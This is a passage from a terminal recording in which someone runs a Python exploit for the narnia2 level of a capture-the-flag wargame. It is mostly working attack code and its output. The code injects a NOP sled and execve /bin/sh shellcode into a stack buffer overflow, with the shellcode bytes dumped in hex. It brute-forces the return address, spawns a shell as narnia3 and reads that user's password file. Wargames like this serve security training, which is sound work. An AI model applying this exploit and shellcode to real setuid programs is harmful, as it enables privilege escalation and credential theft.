saved EBP = 'BBBB'\")\r\r\nprint(\"   [132..135] return address, little-endian\")\r\r\n\r\r\nenv = {k.encode(): v.encode() for k, v in os.environ.items()}\r\r\n\r\r\n"]
[0.000, "o", "# ---------------------------------------------------------------------------\r\r\n# 3. Probe one candidate address: fork, run narnia2 with the payload, capture\r\r\n#    output, and look for the marker the shellcode writes first.\r\r\n#\r\r\n"]
[0.000, "o", "#    Important subtlety: narnia2 itself does printf(\"%s\", buf), so the raw\r\r\n#    payload -- including the bytes \"PWN!\" that sit inside the shellcode -- is\r\r\n#    echoed even when the return address does NOT land in the sled.  A naive\r\r\n#    \"PWN!\" search therefore reports a hit on every address.  The real signal\r\r\n#    is that the process does NOT crash: with a working return address the\r\r\n#    shellcode runs, prints its marker and replaces the process with /bin/sh,\r\r\n#    so the exit status is not a signal death.\r\r\n# ---------------------------------------------------------------------------\r\r\ndef probe(addr):\r\r\n    \"\"\"Run narnia2 with the payload and ask the shell it should spawn to\r\r\n    answer.  Requiring a real reply rules out two false positives:\r\r\n      * printf(\"%s\", buf) echoes the payload, which already contains \"PWN!\";\r\r\n      * a return address landing on 'A' (0x41) or 'B' (0x42) bytes executes\r\r\n        harmless increments and can exit without crashing.\r\r\n    Only a reply from /bin/sh proves the shellcode actually ran.\r\r\n    \"\"\"\r\r\n    # argv cannot contain a NUL byte, so skip addresses whose encoding has one\r\r\n    if 0 in struct.pack(\"<I\", addr):\r\r\n        return False\r\r\n    try:\r\r\n        p = subprocess.Popen([b\"/narnia/narnia2\", payload_for(addr)],\r\r\n                             stdin=subprocess.PIPE, stdout=subprocess.PIPE,\r\r\n                             stderr=subprocess.STDOUT, env=env)\r\r\n        out, _ = p.communicate(b\"echo PROBE_OK\\n\", timeout=2)\r\r\n    except subprocess.TimeoutExpired:\r\r\n        p.kill()\r\r\n        p.communicate()\r\r\n        return False\r\r\n    return b\"PROBE_OK\" in out\r\r\n\r\r\nprint(\"== step 3: sweep return addresses, looking for the marker ==\")\r\r\nprint(\"   the stack is executable (readelf: GNU_STACK RWE) and ASLR is off,\")\r\r\nprint(\"   so the shellcode can sit in argv[1] on the stack itself.\")\r\r\nfound = None\r\r\nt0 = time.time()\r\r\nfor addr in range(0xffffd000, 0xffffe800, 4):\r\r\n    if probe(addr):\r\r\n        found = addr\r\r\n        print(\"   HIT at %#x after %d probes (%.1f s)\" % (addr, (addr - 0xffffd000) // 4 + 1, time.time() - t0))\r\r\n        break\r\r\nif found is None:\r\r\n    print(\"   no address landed in the sled\")\r\r\n    sys.exit(1)\r\r\n\r\r\npl = payload_for(found)\r\r\nprint(\"== step 4: final payload (%d bytes) ==\" % len(pl))\r\r\nprint(\"   ret = %#x  -> points into the NOP sled at buf+%d\" % (found, 0))\r\r\nprint(\"   %s ... %s | %s | %s\" % (pl[:4].hex(\" \"), pl[124:128].hex(\" \"), pl[128:132].hex(\" \"), pl[132:136].hex(\" \")))\r\r\nprint(\"   first 8 bytes: %s   (0x90 = NOP)\" % pl[:8].hex(\" \"))\r\r\n\r\r\n# ---------------------------------------------------------------------------\r\r\n# 5. Confirm the winning address once more, with the real commands, so the\r\r\n#    transcript shows the shell running as narnia3.\r\r\n# ---------------------------------------------------------------------------\r\r\nprint(\"== step 5: run the winning address and use the shell ==\")\r\r\np = subprocess.Popen([b\"/narnia/narnia2\", payload_for(found)],\r\r\n                     stdin=subprocess.PIPE, stdout=subprocess.PIPE,\r\r\n                     stderr=subprocess.STDOUT, env=env)\r\r\nout, _ = p.communicate(b\"id\\ncat /etc/narnia_pass/narnia3\\n\", timeout=5)\r\r\nprint(out.decode(\"latin-1\"), flush=True)\r\r\nif b\"narnia3\" not in out:\r\r\n    print(\"   the address did not give a working shell\")\r\r\n    sys.exit(1)\r\r\nprint(\"== done: the shell ran as narnia3 ==\")\r\r\n\r\r\n\u001b]3008;end=ab2107cc-0b85-407a-86ea-dfa822a25ba7;exit=success\u001b\\\u001b]3008;start=fb767b35-ec89-450c-b9d7-21327b2c6b7a;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/narnia2\u001b\\\u001b[?2004h\u001b]0;narnia2@narnia: ~\u0007narnia2@narnia:~$ python3 /tmp/e_narnia2.py\r\r\n\u001b[?2004l\r\u001b]3008;start=27461874-c8fb-43db-b472-2b29642784c3;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=narnia2;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/nar"]
[0.002, "o", "nia2\u001b\\== step 1: shellcode taken from the assembler output ==\r\r\n   /tmp/l2.bin: 78 bytes\r\r\n   0000  31 c0 50 68 50 57 4e 21 89 e1 31 db 43 31 d2 b2  1.PhPWN!..1.C1..\r\r\n   0010  04 31 c0 b0 04 cd 80 31 c0 b0 c9 cd 80 89 c3 89  .1.....1........\r\r\n   0020  c1 31 c0 b0 46 cd 80 31 c0 b0 c9 cd 80 89 c3 31  .1..F..1.......1\r\r\n   0030  c0 b0 17 cd 80 31 c0 50 68 2f 2f 73 68 68 2f 62  .....1.Ph//shh/b\r\r\n   0040  69 6e 89 e3 50 53 89 e1 31 d2 b0 0b cd 80        in..PS..1.....\r\r\n   NUL bytes: 0  (argv cannot contain NUL, so this must be 0)\r\r\n== step 2: payload layout (offsets into argv[1]) ==\r\r\n   [0..127]   128-byte buf: 50 NOPs then 78-byte shellcode\r\r\n   [128..131] saved EBP = 'BBBB'\r\r\n   [132..135] return address, little-endian\r\r\n== step 3: sweep return addresses, looking for the marker ==\r\r\n   the stack is executable (readelf: GNU_STACK RWE) and ASLR is off,\r\r\n   so the shellcode can sit in argv[1] on the stack itself.\r\r\n"]
[0.075, "o", "   HIT at 0xffffd1f8 after 127 probes (0.1 s)\r\r\n== step 4: final payload (136 bytes) ==\r\r\n   ret = 0xffffd1f8  -> points into the NOP sled at buf+0\r\r\n   90 90 90 90 ... b0 0b cd 80 | 42 42 42 42 | f8 d1 ff ff\r\r\n   first 8 bytes: 90 90 90 90 90 90 90 90   (0x90 = NOP)\r\r\n== step 5: run the winning address and use the shell ==\r\r\n"]
